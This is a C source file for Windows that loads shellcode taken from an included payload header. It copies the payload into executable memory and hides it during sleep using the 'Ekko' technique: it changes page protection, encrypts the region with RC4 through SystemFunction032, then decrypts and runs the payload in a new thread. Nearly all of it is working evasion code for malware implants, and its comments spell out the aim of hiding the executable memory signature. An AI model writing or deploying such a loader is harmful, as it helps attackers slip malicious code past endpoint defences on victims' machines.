#include <windows.h>
#include <stdio.h>
#include "../common/payload.h"

typedef struct {
    DWORD Length;
    DWORD MaximumLength;
    PVOID Buffer;
} USTRING;

typedef NTSTATUS (NTAPI *pfnSystemFunction032)(USTRING* data, USTRING* key);

/*
   Sleep Obfuscation (Ekko / Foliage pattern):
   1. Changes memory page protection to PAGE_READWRITE (hides executable memory signature)
   2. Encrypts payload in memory using RC4 (SystemFunction032)
   3. Sleeps in obfuscated state
   4. Decrypts payload with key
   5. Restores memory to PAGE_EXECUTE_READWRITE
   6. Executes payload cleanly
*/
void EkkoObfuscatedSleep(PVOID base, SIZE_T size, DWORD sleepMs) {
    HMODULE hAdvapi = LoadLibraryA("advapi32.dll");
    pfnSystemFunction032 SystemFunction032 = (pfnSystemFunction032)GetProcAddress(hAdvapi, "SystemFunction032");

    char key_bytes[16] = { 0x13, 0x37, 0x42, 0x69, 0xAA, 0xBB, 0xCC, 0xDD, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88 };
    USTRING key = { sizeof(key_bytes), sizeof(key_bytes), key_bytes };
    USTRING data = { (DWORD)size, (DWORD)size, base };

    DWORD oldProtect;
    // Step 1: Make payload region RW (not executable)
    VirtualProtect(base, size, PAGE_READWRITE, &oldProtect);

    // Step 2: Encrypt payload in place
    if (SystemFunction032) {
        SystemFunction032(&data, &key);
    }

    // Step 3: Sleep while memory is encrypted and non-executable
    Sleep(sleepMs);

    // Step 4: Decrypt payload in place
    if (SystemFunction032) {
        SystemFunction032(&data, &key);
    }

    // Step 5: Restore executable protection
    VirtualProtect(base, size, oldProtect, &oldProtect);
    FlushInstructionCache(GetCurrentProcess(), base, size);
}

int main() {
    PVOID base = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!base) return 1;

    memcpy(base, payload, payload_len);

    // Obfuscate memory and sleep for 1000ms
    EkkoObfuscatedSleep(base, payload_len, 1000);

    HANDLE th = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)base, NULL, 0, NULL);
    if (th) {
        WaitForSingleObject(th, INFINITE);
        CloseHandle(th);
    }
    return 0;
}
